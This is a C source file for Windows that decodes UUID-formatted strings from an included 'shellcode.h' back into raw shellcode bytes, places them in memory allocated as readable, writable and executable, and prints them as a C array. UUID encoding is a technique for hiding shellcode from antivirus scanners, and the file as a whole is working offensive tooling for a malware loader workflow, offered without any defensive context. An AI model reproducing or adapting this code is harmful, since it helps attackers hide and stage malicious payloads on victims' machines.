#include <windows.h>
#include <stdio.h>
#include "shellcode.h"

void decode_uuid(const char *uuids[], int uuid_count, unsigned char *decoded_shellcode)
{
    for (int i = 0; i < uuid_count; i++)
    {
        unsigned int d1;
        unsigned short d2, d3, d4;
        unsigned long long d5_high, d5_low;

        sscanf_s(uuids[i], "%8x-%4hx-%4hx-%4hx-%4llx%8llx",
                 &d1, &d2, &d3, &d4, &d5_high, &d5_low);

        decoded_shellcode[i * 16 + 0] = (unsigned char)(d1 >> 24);
        decoded_shellcode[i * 16 + 1] = (unsigned char)(d1 >> 16);
        decoded_shellcode[i * 16 + 2] = (unsigned char)(d1 >> 8);
        decoded_shellcode[i * 16 + 3] = (unsigned char)(d1);

        decoded_shellcode[i * 16 + 4] = (unsigned char)(d2 >> 8);
        decoded_shellcode[i * 16 + 5] = (unsigned char)(d2);

        decoded_shellcode[i * 16 + 6] = (unsigned char)(d3 >> 8);
        decoded_shellcode[i * 16 + 7] = (unsigned char)(d3);

        decoded_shellcode[i * 16 + 8] = (unsigned char)(d4 >> 8);
        decoded_shellcode[i * 16 + 9] = (unsigned char)(d4);

        decoded_shellcode[i * 16 + 10] = (unsigned char)(d5_high >> 8);
        decoded_shellcode[i * 16 + 11] = (unsigned char)(d5_high);
        decoded_shellcode[i * 16 + 12] = (unsigned char)(d5_low >> 24);
        decoded_shellcode[i * 16 + 13] = (unsigned char)(d5_low >> 16);
        decoded_shellcode[i * 16 + 14] = (unsigned char)(d5_low >> 8);
        decoded_shellcode[i * 16 + 15] = (unsigned char)(d5_low);
    }
}

int main()
{
    LPVOID shellcode = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (shellcode == NULL)
        return 1;

    decode_uuid(encoded, shellcode_len / 16, (unsigned char *)shellcode);

    printf("\nunsigned char shellcode[] = {");

    for (unsigned int i = 0; i < shellcode_len; i++)
    {
        if (i % 20 == 0)
            printf("\n\t");
        printf("0x%02x,", ((unsigned char *)shellcode)[i]);
    }

    printf("\n};\n");

    return 0;
}
